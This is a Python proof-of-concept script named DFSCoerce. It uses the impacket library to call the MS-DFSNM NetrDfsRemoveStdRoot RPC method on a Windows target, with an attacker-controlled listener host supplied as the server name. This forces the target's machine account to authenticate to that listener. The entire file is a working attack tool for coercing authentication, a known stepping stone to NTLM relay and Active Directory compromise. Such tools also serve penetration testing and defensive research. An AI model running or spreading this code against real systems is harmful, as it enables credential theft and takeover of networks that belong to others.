#!/usr/bin/env python3
#
# Most of this code is stolen from PetitPotam (@topotam)
# https://github.com/topotam/PetitPotam

import sys
import argparse

from impacket import system_errors
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT
from impacket.dcerpc.v5.dtypes import UUID, ULONG, WSTR, DWORD
from impacket.dcerpc.v5.rpcrt import DCERPCException, RPC_C_AUTHN_WINNT, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
from impacket.uuid import uuidtup_to_bin


class DCERPCSessionError(DCERPCException):
    def __init__(self, error_string=None, error_code=None, packet=None):
        DCERPCException.__init__(self, error_string, error_code, packet)

    def __str__(self):
        key = self.error_code
        if key in system_errors.ERROR_MESSAGES:
            error_msg_short = system_errors.ERROR_MESSAGES[key][0]
            error_msg_verbose = system_errors.ERROR_MESSAGES[key][1]
            return 'DFSNM SessionError: code: 0x%x - %s - %s' % (self.error_code, error_msg_short, error_msg_verbose)
        else:
            return 'DFSNM SessionError: unknown error code: 0x%x' % self.error_code


class NetrDfsRemoveStdRoot(NDRCALL):
    opnum = 13
    structure = (
        ('ServerName', WSTR),
        ('RootShare', WSTR),
        ('ApiFlags', DWORD),
    )


class NetrDfsRemoveStdRootResponse(NDRCALL):
    structure = (
        ('ErrorCode', ULONG),
    )
class NetrDfsAddRoot(NDRCALL):
    opnum = 12
    structure = (
         ('ServerName',WSTR),
         ('RootShare',WSTR),
         ('Comment',WSTR),
         ('ApiFlags',DWORD),
     )
class NetrDfsAddRootResponse(NDRCALL):
     structure = (
         ('ErrorCode', ULONG),
     )

class TriggerAuth():
    def connect(self, username, password, domain, lmhash, nthash, target, doKerberos, dcHost, targetIp):
        rpctransport = transport.DCERPCTransportFactory(r'ncacn_np:%s[\PIPE\netdfs]' % target)
        if hasattr(rpctransport, 'set_credentials'):
            rpctransport.set_credentials(username=username, password=password, domain=domain, lmhash=lmhash, nthash=nthash)

        if doKerberos:
            rpctransport.set_kerberos(doKerberos, kdcHost=dcHost)
        if targetIp:
            rpctransport.setRemoteHost(targetIp)
        dce = rpctransport.get_dce_rpc()
        print("[-] Connecting to %s" % r'ncacn_np:%s[\PIPE\netdfs]' % target)
        try:
            dce.connect()
        except Exception as e:
            print("Something went wrong, check error status => %s" % str(e))
            return

        try:
            dce.bind(uuidtup_to_bin(('4FC742E0-4A10-11CF-8273-00AA004AE673', '3.0')))
        except Exception as e:
            print("Something went wrong, check error status => %s" % str(e))
            return
        print("[+] Successfully bound!")
        return dce

    def NetrDfsRemoveStdRoot(self, dce, listener):
        print("[-] Sending NetrDfsRemoveStdRoot!")
        try:
            request = NetrDfsRemoveStdRoot()
            request['ServerName'] = '%s\x00' % listener
            request['RootShare'] = 'test\x00'
            request['ApiFlags'] = 1
            request.dump()
            resp = dce.request(request)

        except  Exception as e:
            print(e)


def main():
    parser = argparse.ArgumentParser(add_help=True, description="DFSCoerce - PoC to coerce machine account authentication via MS-DFSNM NetrDfsRemoveStdRoot()")
    parser.add_argument('-u', '--username', action="store", default='', help='valid username')
    parser.add_argument('-p', '--password', action="store", default='', help='valid password (if omitted, it will be asked unless -no-pass)')
    parser.add_argument('-d', '--domain', action="store", default='', help='valid domain name')
    parser.add_argument('-hashes', action="store", metavar="[LMHASH]:NTHASH", help='NT/LM hashes (LM hash can be empty)')

    parser.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    parser.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                                                        '(KRB5CCNAME) based on target parameters. If valid credentials '
                                                        'cannot be found, it will use the ones specified in the command '
                                                        'line')
    parser.add_argument('-dc-ip', action="store", metavar="ip address", help='IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter')
    parser.add_argument('-target-ip', action='store', metavar="ip address",
                        help='IP Address of the target machine. If omitted it will use whatever was specified as target. '
                             'This is useful when target is the NetBIOS name or Kerberos name and you cannot resolve it')
    parser.add_argument('listener', help='ip address or hostname of listener')
    parser.add_argument('target', help='ip address or hostname of target')
    options = parser.parse_args()

    if options.hashes is not None:
        lmhash, nthash = options.hashes.split(':')
    else:
        lmhash = ''
        nthash = ''

    if options.password == '' and options.username != '' and options.hashes is None and options.no_pass is not True:
        from getpass import getpass
        options.password = getpass("Password:")

    trigger = TriggerAuth()

    dce = trigger.connect(username=options.username, password=options.password, domain=options.domain, lmhash=lmhash, nthash=nthash, target=options.target, doKerberos=options.k, dcHost=options.dc_ip, targetIp=options.target_ip)
    if dce is not None:
        trigger.NetrDfsRemoveStdRoot(dce, options.listener)
        dce.disconnect()
    sys.exit()


if __name__ == '__main__':
    main()
